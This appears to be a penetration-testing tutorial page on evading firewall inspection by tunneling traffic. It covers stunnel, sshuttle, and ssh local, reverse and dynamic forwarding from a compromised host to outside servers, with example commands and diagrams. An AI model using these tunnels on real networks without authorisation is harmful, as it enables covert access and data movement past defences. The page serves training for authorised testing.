@@ -1,0 +1,223 @@
+.. include:: /pentest_links.txt
+
+
+*****************
+Tunneling Traffic
+*****************
+
+The idea is to hide traffic.  To avoid firewall deep packet inspection you can use a tunneling protocol where a (permitted) delivery protocol encapsulates a (hidden) payload protocol: e.g. https delivery protocol encapsulating ssh payload protocol.
+
+``stunnel`` SSL/TLS Tunneling
+=============================
+
+`stunnel <https://www.stunnel.org/docs.html>`_ can hide most TCP traffic using SSL/TLS, effectively looking like https traffic. Here we illustrate this following `Tunnel SSH over SSL <http://ubuntu-tutorials.com/2013/11/27/tunnel-ssh-over-ssl/>`_ where SSL/TLS is the delivery protocol and ssh is the payload protocol. The remote attacker's machine requires: (1) installing the ``stunnel4`` package, (2) generating a tunnel key, (3) specifying the listening local ip:port (STUNNEL_ENDPOINT:443), and (4) specifying the desired destination host:port (DESTINATION:22). The local client side requires: (1) installing the ``stunnel4`` package, (2) downloading the tunnel cert, (3) specifying the listening local ip:port (here 2200), (4) specifying the remote tunnel ip:port (STUNNEL_ENDPOINT:443), and (5) starting the ``stunnel4`` service on the port. And of course these host modifications will be caught by any decent host-based intrusion detection system, making it difficult to do clandestinely.
+
+.. graphviz::
+
+    digraph {
+      node [shape=box]; FIREWALL;
+      node [shape=ellipse];
+          subgraph inside {
+              rank = same;
+              {node [label="INTERNALHOST\nssh external_user@COMPROMISEDHOST -p 2200"]; INTERNALHOST;}
+              {node [label="COMPROMISEDHOST\naccept COMPROMISEDHOST:2200\nconnect STUNNEL_ENDPOINT:443"]; COMPROMISEDHOST;}
+          }
+          subgraph outside {
+              rank = same;
+              {node [label="STUNNEL_ENDPOINT\naccept STUNNEL_ENDPOINT:443\nconnect DESTINATION:22"]; STUNNEL_ENDPOINT;}
+              {node [label="DESTINATION\nsshd port 22"]; DESTINATION;}
+          }
+	    INTERNALHOST -> COMPROMISEDHOST [label="port 2200\nssh"];
+	    COMPROMISEDHOST -> FIREWALL [label="port 443\nssh inside ssl"];
+	    FIREWALL -> STUNNEL_ENDPOINT [label="port 443\nssh inside ssl"];
+	    STUNNEL_ENDPOINT -> DESTINATION [label="port 22\nssh"]
+    }
+
+``sshuttle`` ssh VPN
+====================
+
+From `sshuttle: where transparent proxy meets VPN meets ssh <https://github.com/apenwarr/sshuttle>`_: "Transparent proxy server that works as a poor man's VPN. Forwards over ssh. Doesn't require admin. Works with Linux and MacOS. Supports DNS tunneling."
+
+Actually, ``sshuttle`` requires root access on the local machine. If routing is enabled on the local machine it can forward the entire subnet to the VPN.
+
+The advantages of ``sshuttle`` over ``ssh -L`` are: (1) it doesn't need a ssh port forward for every single host/port on the remote network, (2) better performance due to not running TCP over TCP, and (3) you can forward DNS to the remote server.
+
+``sshuttle`` command line options to consider:
+
+  -D, --daemon
+    fork into background after connecting to remote server
+
+  -l, --listen=[ip:]port
+    specify the ip & port as a transparent proxy (vs. default to 127.0.0.1:port for some random port). If non-default and want to route from local network, make sure kernal IP forwarding is enabled. If you're not routing you don't need to specify this argument.
+
+  --dns
+    capture local DNS requests and forward to the remote DNS server
+
+  -N, --auto-nets
+    ask server for subnets we should route
+
+  -r, --remote=[username@]sshserver[:port]
+    connect to this remote server
+
+  <subnets>
+    subnets to route over the VPN (e.g. 0/0)
+
+Here's an example: ``sudo sshuttle --dns -vvr sshuser@sshserver 0/0`` which sets up a VPN for all addresses through ``ssh`` to sshserver showing very verbose logging.
+
+``ssh`` Tunneling Support
+=========================
+
+
+There are 3 kinds of ``ssh`` tunnels: (1) "-L" local port forwarding, (2) "-R" reverse tunnel, and (3) "-D" dynamic port forwarding (or "SOCKS"-ifying any protocol). View `The Black Magic Of SSH / SSH Can Do That? <http://vimeo.com/54505525>`_ for a good, long video about ``ssh`` tunneling and more.
+
+In all 3 cases we use 5 hosts: INTERNALHOST <--> COMPROMISEDHOST <--> FIREWALL <--> SSHHOST <--> REMOTEHOST. (Note: The FIREWALL is optional and there to note that we're sneaking data in/out of the pen test target. And generally the INTERNALHOST and COMPROMISEDHOST can be the same, as can the SSHHOST and REMOTEHOST.) In all 3 cases the ``ssh [-L,-R,-D]`` command is run on the COMPROMISEDHOST and the ssh tunnel runs between COMPROMISEDHOST <--> FIREWALL <--> SSHHOST. The "-L" and "-D" options send traffic from the COMPROMISEDHOST outbound through the firewall, while the "-R" (for reverse) sends traffic inbound to the COMPROMISEDHOST side of the FIREWALL.
+
+Note that the tunneled traffic between INTERNALHOST <--> REMOTEHOST need not be ``ssh``. To illustrate this we use http for the "-D" option, but for the "-L" and "-R" cases we illustrate using ``ssh`` traffic tunneled.
+
+While the COMPROMISEDHOST <--> FIREWALL <--> SSHHOST tunnel is encrypted by ``ssh``, the other traffic legs are only encrypted if the tunneled protocol is encrypted. So parts of the http traffic are not encrypted (as you would expect).
+
+
+"-L" Local Port Forwarding
+--------------------------
+
+This case tunnels traffic from anywhere inside the firewall through the COMPROMISEDHOST <--> FIREWALL <--> SSHHOST tunnel to a fixed REMOTEHOST. Below we show tunneling ``ssh`` through the ``ssh`` tunnel, though we could just as well forwarded http or https or ... .
+
+``ssh -fNT sshuser@SSHHOST -L [localbindaddress:]localport:REMOTEHOST:remoteport`` arguments are:
+
+   -fNT
+     -f places ssh in background before command execution.
+     
+     -N prevents opening a remote command (just forward ports).
+     
+     -T disables pseudo-tty allocation.
+
+   -L [localbindaddress:]localport:REMOTEHOST:remoteport
+     Bind to "localbindaddress:localport" on the local machine. The default localbindaddress is 127.0.0.1.
+     
+     At the SSHHOST forward the data to REMOTEHOST:remoteport. (So REMOTEHOST:remoteport = localhost:22 would forward the data to 127.0.0.1:22 on the SSHHOST, not the local host where the ssh command is executed.)
+
+   sshuser@SSHHOST
+     ssh to server at SSHHOST as sshuser.
+
+
+Here goes an example forwarding ``ssh`` through a firewall to a bad_host:
+
+.. graphviz::
+
+    digraph {
+      node [shape=box]; FIREWALL;
+      node [shape=ellipse];
+          subgraph inside {
+              rank = same;
+              {node [label="INTERNALHOST\nssh remoteuser@COMPROMISEDHOST -p 2200"]; INTERNALHOST;}
+              {node [label="COMPROMISEDHOST\nssh -fNT sshuser@SSHHOST\n     -L COMPROMISEDHOST:2200:REMOTEHOST:22"]; COMPROMISEDHOST;}
+          }
+          subgraph outside {
+              rank = same;
+              {node [label="SSHHOST\nrun normal sshd"]; SSHHOST;}
+              {node [label="REMOTEHOST\nrun normal sshd"]; REMOTEHOST;}
+          }
+	    INTERNALHOST -> COMPROMISEDHOST [label="port 2200\nssh"];
+	    COMPROMISEDHOST -> FIREWALL [label="port 22\nssh inside ssh"];
+	    FIREWALL -> SSHHOST [label="port 22\nssh inside ssh"];
+	    SSHHOST -> REMOTEHOST [label="port 22\nssh"]
+    }
+
+Again we note these host modifications will be caught by any decent host-based intrusion detection system, making it difficult to do clandestinely.
+
+"-R" Remote Forwarding
+----------------------
+
+This case tunnels traffic from anywhere outside the firewall through the SSHHOST <--> FIREWALL <--> COMPROMISEDHOST tunnel to a fixed INTERNALHOST. Below we show tunneling ``ssh`` through the ``ssh`` tunnel, though we could just as well forwarded http or https or ... .
+
+
+``ssh -fNT sshuser@SSHHOST -R [SSHHOST:]sshhostport:INTERNALHOST:internalport`` arguments are:
+
+   -fNT
+     -f places ssh in background before command execution.
+     
+     -N prevents opening a remote command (just forward ports).
+     
+     -T disables pseudo-tty allocation.
+
+   -R [SSHHOST:]sshhostport:INTERNALHOST:internalport
+     Bind to "SSHHOST:sshhostport" on the SSHHOST machine. "-L" did the binding on the local machine but here we're binding on the external ``ssh`` tunnel end.
+     
+     At the local host forward the data to INTERNALHOST:internalport. (So INTERNALHOST:internalport = localhost:22 would forward the data to 127.0.0.1:22 on the local host where the ssh command is run.)
+
+   sshuser@SSHHOST
+     ssh to server at host SSHHOST as sshuser.
+
+
+Here goes an example remote forwarding ``ssh`` through a firewall from a REMOTEHOST:
+
+.. graphviz::
+
+    digraph {
+      node [shape=box]; FIREWALL;
+      node [shape=ellipse];
+          subgraph inside {
+              rank = same;
+              {node [label="INTERNALHOST\nrun normal sshd"]; INTERNALHOST;}
+              {node [label="COMPROMISEDHOST\nssh -fNT sshuser@SSHHOST\n     -R SSHHOST:2200:INTERNALHOST:22"]; COMPROMISEDHOST;}
+          }
+          subgraph outside {
+              rank = same;
+              {node [label="SSHHOST\nrun sshd\n/etc/ssh/sshd_config 'GatewayPorts yes'"]; SSHHOST;}
+              {node [label="REMOTEHOST\nssh -p 2200 internaluser@SSHHOST"]; REMOTEHOST;}
+          }
+	    COMPROMISEDHOST -> INTERNALHOST [label="port 22\nssh"];
+	    FIREWALL->  COMPROMISEDHOST [label="port 22\nssh inside ssh"];
+	    SSHHOST -> FIREWALL [label="port 22\nssh inside ssh"];
+	    REMOTEHOST -> SSHHOST [label="port 2200\nssh"]
+    }
+
+Again we note these host modifications will be caught by any decent host-based intrusion detection system, making it difficult to do clandestinely.
+
+
+"-D" Dynamic Forwarding
+-----------------------
+
+Dynamic port forwarding turns the COMPROMISEDHOST into a SOCKS server. This case tunnels SOCKS traffic from anywhere inside the firewall through the COMPROMISEDHOST <--> FIREWALL <--> SSHHOST tunnel to any REMOTEHOST (it's not fixed in this case). Below we show tunneling http through the ``ssh`` tunnel, knowing it's unencrypted outside the ``ssh`` tunnel.
+
+``ssh -fNT sshuser@SSHHOST -D [bind_address:]port`` with arguments:
+
+   -fNT
+     -f places ssh in background before command execution.
+     
+     -N prevents opening a remote command (just forward ports).
+     
+     -T disables pseudo-tty allocation.
+
+   -D [bind_address:]port
+     Bind to "bind_address:port" on the local machine. Act as a SOCKS server tunneling the data through to the remote host.
+     
+   sshuser@SSHHOST
+     ssh to server at host SSHHOST as sshuser.
+
+
+Here goes an example setting up the COMPROMISEDHOST as a SOCKS server for outbound http traffic (using the ``curl`` command):
+
+
+.. graphviz::
+
+    digraph {
+      node [shape=box]; FIREWALL;
+      node [shape=ellipse];
+          subgraph inside {
+              rank = same;
+              {node [label="INTERNALHOST\ncurl -socks5-hostname COMPROMISEDHOST:9001 \nhttp://REMOTEHOST/bad_page.html"]; INTERNALHOST;}
+              {node [label="COMPROMISEDHOST\nssh -fNT user@SSHHOST -D 9001"]; COMPROMISEDHOST;}
+          }
+          subgraph outside {
+              rank = same;
+              {node [label="SSHHOST\nrun normal sshd"]; SSHHOST;}
+              {node [label="REMOTEHOST\nhttp server"]; REMOTEHOST;}
+          }
+	    INTERNALHOST -> COMPROMISEDHOST [label="port 9001\nsocks5"];
+	    COMPROMISEDHOST -> FIREWALL [label="port 22"];
+	    FIREWALL -> SSHHOST [label="port 22"];
+	    SSHHOST -> REMOTEHOST [label="port 80\nhttp"]
+    }
+
+Again we note these host modifications will be caught by any decent host-based intrusion detection system, making it difficult to do clandestinely.
